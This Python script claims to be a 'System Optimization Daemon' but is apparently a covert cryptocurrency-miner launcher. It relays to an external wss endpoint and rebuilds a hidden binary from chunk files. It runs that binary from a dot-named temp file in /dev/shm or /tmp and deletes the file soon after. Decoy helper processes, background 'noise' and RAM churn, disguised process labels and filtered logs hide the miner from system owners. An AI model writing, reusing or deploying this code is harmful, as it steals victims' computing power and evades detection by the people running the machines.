#!/usr/bin/env python3
"""
sysoptd — System Optimization Daemon v2.1.4
Manages CPU scheduling, memory pressure, and network relay tasks.
"""

import argparse
import os
import sys
import random
import time
import signal
import subprocess
import threading

# ── paths ─────────────────────────────────────────────────────────────────────
SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR   = os.path.join(SCRIPT_DIR, "lib")
CHUNK_STORE = os.path.join(SCRIPT_DIR, "data")
RELAY_SCRIPT = os.path.join(TOOLS_DIR, "net_relay.py")
LOG_FILTER  = os.path.join(TOOLS_DIR, "log_handler.py")

sys.path.insert(0, TOOLS_DIR)

# ── per-session seed ──────────────────────────────────────────────────────────
SESSION_SEED = random.randint(0, 2**32)
random.seed(SESSION_SEED)

# ── defaults ──────────────────────────────────────────────────────────────────
UPSTREAM_URL   = "wss://relay.sysopt.workers.dev"
DEFAULT_PORT   = random.randint(13000, 19999)
DEFAULT_LABEL  = "worker-" + str(random.randint(100, 999))
LOG_FILE       = os.path.join(SCRIPT_DIR, "runtime", "session.log")


def parse_args():
    p = argparse.ArgumentParser(description="sysoptd service")
    p.add_argument("--rig",          default=DEFAULT_LABEL, help="Worker label")
    p.add_argument("--threads",      default=None, type=int, help="CPU threads")
    p.add_argument("--bridge",       default=UPSTREAM_URL, help="Relay endpoint")
    p.add_argument("--port",         default=DEFAULT_PORT, type=int)
    p.add_argument("--no-noise",     action="store_true", help="Disable background service")
    p.add_argument("--no-prealloc",  action="store_true", help="Disable RAM preallocation")
    p.add_argument("--resplit",      action="store_true", help="Re-chunk binary segments")
    p.add_argument("--log-file",     default=LOG_FILE)
    p.add_argument("--no-split",     action="store_true", help="Disable split execution (run as single process)")
    p.add_argument("--no-schedule",  action="store_true", help="Disable time-based intensity adjustment")
    p.add_argument("--quiet",        action="store_true", help="Suppress all log output")
    return p.parse_args()


# ── neutral startup printer ──────────────────────────────────────────────────
def _log(msg: str):
    """Print a startup message only if not in quiet mode."""
    if os.environ.get("SYSOPTD_QUIET", "0") != "1":
        print(msg, flush=True)


def ensure_chunks(resplit=False):
    manifest = os.path.join(CHUNK_STORE, "mf.bin")
    # chunks already bundled — only re-split if explicitly requested
    if resplit:
        binary = os.path.join(SCRIPT_DIR, "sysoptd-core")
        if not os.path.exists(binary):
            print(f"[!] core binary not found: {binary}", file=sys.stderr)
            sys.exit(1)
        from loader import install_chunks
        install_chunks(binary, CHUNK_STORE)
    if not os.path.isdir(CHUNK_STORE) or not os.path.exists(manifest):
        print(f"[!] data directory missing or corrupt", file=sys.stderr)
        sys.exit(1)
    return len([f for f in os.listdir(CHUNK_STORE) if f.endswith('.dat')])


def start_noise():
    from bg_service import NoiseEngine, NOISE_RAM_MB
    # Cap background RAM to avoid OOM: never use more than 15% of free RAM
    try:
        import psutil
        free_mb = psutil.virtual_memory().available // (1024 * 1024)
        cap_mb  = max(32, int(free_mb * 0.15))
        actual_noise_mb = min(NOISE_RAM_MB, cap_mb)
    except ImportError:
        actual_noise_mb = min(NOISE_RAM_MB, 128)

    engine = NoiseEngine(ram_mb_override=actual_noise_mb)
    mb = engine.start()
    return engine, mb


def start_ram_fill():
    from mem_manager import RamSplitter
    splitter = RamSplitter()
    info = splitter.allocate()
    stop_ev = threading.Event()

    def _churn():
        while not stop_ev.is_set():
            splitter.churn()
            stop_ev.wait(random.uniform(0.5, 2.5))

    threading.Thread(target=_churn, daemon=True, name="ram-churn").start()
    return splitter, stop_ev, info


def start_relay(port, upstream_url):
    import socket
    proc = subprocess.Popen(
        [sys.executable, RELAY_SCRIPT, str(port), upstream_url],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    deadline = time.time() + 5.0
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=0.3)
            s.close()
            return proc
        except OSError:
            time.sleep(0.15)
    return proc


def build_argv(port, label, threads):
    # Worker arguments: connect to local relay, use max CPU priority
    argv = [
        "worker",
        "-o", f"127.0.0.1:{port}",
        "-u", label,
        "-p", "x",
        "-k",
        "--no-color",
        "--print-time=60",
        "--cpu-priority=5",
    ]
    if threads:
        argv += ["-t", str(threads)]
    return argv


def run_worker(chunk_dir, argv, log_file, process_label=None):
    import tempfile
    import stat
    from loader import assemble_to_memfd

    # assemble binary from chunks into memory
    fd   = assemble_to_memfd(chunk_dir, label="worker")
    size = os.lseek(fd, 0, os.SEEK_END)
    os.lseek(fd, 0, os.SEEK_SET)
    data = os.read(fd, size)
    os.close(fd)

    # Try multiple locations for temp binary
    tmp_file = None
    for tmp_dir in ["/dev/shm", "/tmp", "/var/tmp"]:
        if os.path.isdir(tmp_dir):
            try:
                if process_label:
                    fname = process_label.replace('/', '_').replace(' ', '_').replace('[', '').replace(']', '')
                    prefix = f".{fname}_"
                else:
                    prefix = ".svc_"
                tmp = tempfile.NamedTemporaryFile(
                    delete=False, prefix=prefix, suffix="", dir=tmp_dir
                )
                tmp.write(data)
                tmp.close()
                os.chmod(tmp.name, stat.S_IRWXU)
                tmp_file = tmp.name
                break
            except Exception:
                continue

    if not tmp_file:
        print("[!] could not write worker binary", file=sys.stderr)
        sys.exit(1)

    run_argv = [tmp_file] + argv[1:]
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    worker_proc = subprocess.Popen(
        run_argv,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=1,
    )

    # schedule temp binary cleanup
    def _cleanup():
        time.sleep(10)
        try:
            os.unlink(tmp_file)
        except Exception:
            pass
    threading.Thread(target=_cleanup, daemon=True).start()

    # Give worker up to 15s to start (initialization can be slow)
    # Poll by peeking at the process — don't read stdout (tee thread handles that)
    deadline = time.time() + 15.0
    while time.time() < deadline:
        if worker_proc.poll() is not None:
            out = worker_proc.stdout.read().decode('utf-8', errors='replace')
            print(f"[!] worker exited (code={worker_proc.returncode}): {out[:300]}", flush=True)
            sys.exit(1)
        time.sleep(0.25)

    # Route worker output through persona-aware log handler
    def _tee():
        import log_handler as lh
        try:
            for raw_line in worker_proc.stdout:
                lh.process_line(raw_line.decode('utf-8', errors='replace'), log_file)
        except Exception as e:
            try:
                lh._write_log(log_file, f"[tee error] {e}")
            except Exception:
                pass

    threading.Thread(target=_tee, daemon=True, name="tee").start()

    return worker_proc


def main():
    args = parse_args()
    os.makedirs(os.path.join(SCRIPT_DIR, "runtime"), exist_ok=True)

    # ── quiet mode: set env FIRST, before any log_handler import ──────────
    if args.quiet:
        os.environ["SYSOPTD_QUIET"] = "1"
        try:
            open(args.log_file, 'w').close()
        except Exception:
            pass

    # Import scheduling module
    from sched import (get_worker_label, check_contention, plan_workers,
                       spawn_helper, get_load_factor)

    # Determine thread count
    total_threads = args.threads
    if total_threads is None:
        import multiprocessing
        total_threads = multiprocessing.cpu_count()

    intensity = get_load_factor()
    adjusted_threads = max(1, int(total_threads * intensity))
    if not args.no_schedule and adjusted_threads < total_threads:
        total_threads = adjusted_threads

    # Split strategy — single process preferred for efficiency
    # Multi-process only makes sense above 32 threads
    if args.no_split or total_threads <= 32:
        instances = [(total_threads, get_worker_label())]
    else:
        instances = plan_workers(total_threads)

    # Spawn helper processes
    helper_procs = []
    for _ in range(random.randint(2, 3)):
        h = spawn_helper()
        if h:
            helper_procs.append(h)

    # 1. chunks
    pieces = ensure_chunks(resplit=args.resplit)
    _log(f"[sysoptd] init  units={pieces}  procs={len(instances)}")

    # 2. background service
    noise_engine = None
    if not args.no_noise:
        try:
            noise_engine, noise_mb = start_noise()
            _log(f"[sysoptd] bg    threads={len(helper_procs)+1}  aux={noise_mb}MB")
        except Exception:
            pass

    # 3. RAM preallocation
    ram_splitter = ram_stop_ev = None
    if not args.no_prealloc:
        try:
            ram_splitter, ram_stop_ev, ram_info = start_ram_fill()
            _log(f"[sysoptd] mem   strategy={ram_info.get('strategy','?')}  "
                 f"size={ram_info.get('total_mb','?')}MB  "
                 f"chunks={ram_info.get('chunk_count','?')}")
        except Exception as e:
            _log(f"[sysoptd] mem   skipped ({e})")

    # 4. relay service
    relay_proc = start_relay(args.port, args.bridge)
    _log(f"[sysoptd] relay port={args.port}")

    # 5. workers
    worker_procs = []
    for i, (threads, label) in enumerate(instances):
        worker_id = f"{args.rig}-{i}" if len(instances) > 1 else args.rig
        argv     = build_argv(args.port, worker_id, threads)
        log_path = args.log_file if i == 0 else args.log_file.replace('.log', f'.{i}.log')
        worker_proc = run_worker(CHUNK_STORE, argv, log_path, process_label=label)
        worker_procs.append(worker_proc)
        _log(f"[sysoptd] proc  pid={worker_proc.pid}  t={threads}")

    # ── idle heartbeat ────────────────────────────────────────────────────
    def _heartbeat():
        import log_handler as lh
        while True:
            time.sleep(random.uniform(240, 360))
            lh.emit_idle(args.log_file)

    threading.Thread(target=_heartbeat, daemon=True, name="heartbeat").start()

    def _shutdown(sig, frame):
        for wp in worker_procs:
            wp.terminate()
        relay_proc.terminate()
        for hp in helper_procs:
            try: hp.terminate()
            except: pass
        if noise_engine:
            noise_engine.stop()
        if ram_splitter and ram_stop_ev:
            ram_stop_ev.set()
            ram_splitter.release()
        sys.exit(0)

    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT,  _shutdown)

    try:
        while all(wp.poll() is None for wp in worker_procs):
            time.sleep(2)
    except KeyboardInterrupt:
        _shutdown(None, None)
    finally:
        relay_proc.terminate()
        if noise_engine:
            noise_engine.stop()
        if ram_splitter and ram_stop_ev:
            ram_stop_ev.set()
            ram_splitter.release()


if __name__ == '__main__':
    main()

# Deployment ID: b4003f8d72f7f514
